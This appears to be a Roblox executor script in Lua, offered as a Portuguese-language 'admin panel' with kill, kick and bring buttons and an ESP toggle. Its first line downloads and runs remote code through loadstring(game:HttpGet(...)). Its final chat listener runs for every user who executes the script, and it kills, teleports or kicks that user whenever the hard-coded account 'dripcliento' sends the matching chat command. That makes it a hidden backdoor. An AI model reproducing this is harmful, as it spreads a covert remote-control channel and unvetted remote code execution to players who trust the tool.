local redzlib = loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/Library-ui/refs/heads/main/Redzhubui"))()

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

getgenv().ScriptID = "DripWow" 
local allowedUsers = {
    ["dripcliento"] = true,
}

local selectedPlayer = nil
local isESPEnabled = false
local ESPObjects = {}

local function CreateESPForPlayer(player)
    local character = player.Character
    if character and character:FindFirstChild("Head") and not ESPObjects[player] then
        local billboard = Instance.new("BillboardGui")
        billboard.Name = "ESPTag"
        billboard.Size = UDim2.new(0, 100, 0, 30)
        billboard.Adornee = character.Head
        billboard.AlwaysOnTop = true
        billboard.StudsOffset = Vector3.new(0, 2, 0)
        billboard.Parent = character

        local text = Instance.new("TextLabel")
        text.Size = UDim2.new(1, 0, 1, 0)
        text.BackgroundTransparency = 1
        text.Text = player.Name
        text.TextColor3 = Color3.fromRGB(255, 0, 0)
        text.TextScaled = true
        text.Font = Enum.Font.SourceSansBold
        text.Parent = billboard

        ESPObjects[player] = billboard
    end
end

local function RemoveESPForPlayer(player)
    if ESPObjects[player] then
        ESPObjects[player]:Destroy()
        ESPObjects[player] = nil
    end
end

local function UpdateESP()
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            local hasSameScript = false
            pcall(function()
                local gui = plr:FindFirstChild("PlayerGui")
                hasSameScript = gui and gui:FindFirstChild("AdminPanelGUI") ~= nil
            end)

            if hasSameScript and isESPEnabled then
                CreateESPForPlayer(plr)
            else
                RemoveESPForPlayer(plr)
            end
        end
    end
end

RunService.Heartbeat:Connect(function()
    if isESPEnabled then
        UpdateESP()
    end
end)

if allowedUsers[LocalPlayer.Name] then
    local Window = redzlib:MakeWindow({
        Title = "Painel de Admin",
        SubTitle = "Sistema de Administração",
        SaveFolder = "AdminPanel_RedzLib"
    })

    local AdminTab = Window:MakeTab({"Admin", "shield"})

    AdminTab:AddSection({"Seleção de Jogador"})

    local playerOptions = {}
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            table.insert(playerOptions, player.Name)
        end
    end

    local PlayerDropdown = AdminTab:AddDropdown({
        Name = "Selecionar Jogador",
        Default = "Nenhum",
        Options = playerOptions,
        Callback = function(Value)
            for _, player in ipairs(Players:GetPlayers()) do
                if player.Name == Value and player ~= LocalPlayer then
                    selectedPlayer = player
                    break
                end
            end
        end    
    })

    local function updatePlayerList()
        local playerNames = {}
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                table.insert(playerNames, player.Name)
            end
        end
        PlayerDropdown:Refresh(playerNames, "Nenhum")
    end

    Players.PlayerAdded:Connect(updatePlayerList)
    Players.PlayerRemoving:Connect(updatePlayerList)

    AdminTab:AddSection({"Comandos"})

    AdminTab:AddButton({
        "Puxar Jogador", 
        function()
            if selectedPlayer then
                TextChatService.TextChannels.RBXGeneral:SendAsync("/bring " .. selectedPlayer.Name)
            end
        end
    })

    AdminTab:AddButton({
        "Matar Jogador", 
        function()
            if selectedPlayer then
                TextChatService.TextChannels.RBXGeneral:SendAsync("/kill " .. selectedPlayer.Name)
            end
        end
    })

    AdminTab:AddButton({
        "Expulsar Jogador", 
        function()
            if selectedPlayer then
                TextChatService.TextChannels.RBXGeneral:SendAsync("/kick " .. selectedPlayer.Name)
            end
        end
    })

    AdminTab:AddSection({"ESP"})

    AdminTab:AddToggle({
        Name = "ESP Administradores",
        Default = false,
        Callback = function(Value)
            isESPEnabled = Value
            if not isESPEnabled then
                for _, obj in pairs(ESPObjects) do
                    obj:Destroy()
                end
                ESPObjects = {}
            end
        end    
    })
end

TextChatService.TextChannels.RBXGeneral.MessageReceived:Connect(function(message)
    local text = message.Text:lower()
    local sender = message.TextSource and Players:GetPlayerByUserId(message.TextSource.UserId)

    if not sender or not allowedUsers[sender.Name] then return end

    local function findTarget(name)
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Name:lower():sub(1, #name) == name then
                return player
            end
        end
    end

    local args = {}
    for word in text:gmatch("%S+") do
        table.insert(args, word)
    end

    local cmd = args[1]
    local target = args[2] and findTarget(args[2])

    if cmd == "/kill" and target and target == LocalPlayer then
        local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
        if hum then hum.Health = 0 end
    elseif cmd == "/kick" and target and target == LocalPlayer then
        LocalPlayer:Kick("Você foi expulso pelo painel de admin.")
    elseif cmd == "/bring" and target and target == LocalPlayer then
        local targetRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        local senderRoot = sender.Character and sender.Character:FindFirstChild("HumanoidRootPart")
        if targetRoot and senderRoot then
            targetRoot.CFrame = senderRoot.CFrame + Vector3.new(2, 0, 0)
        end
    end
end)
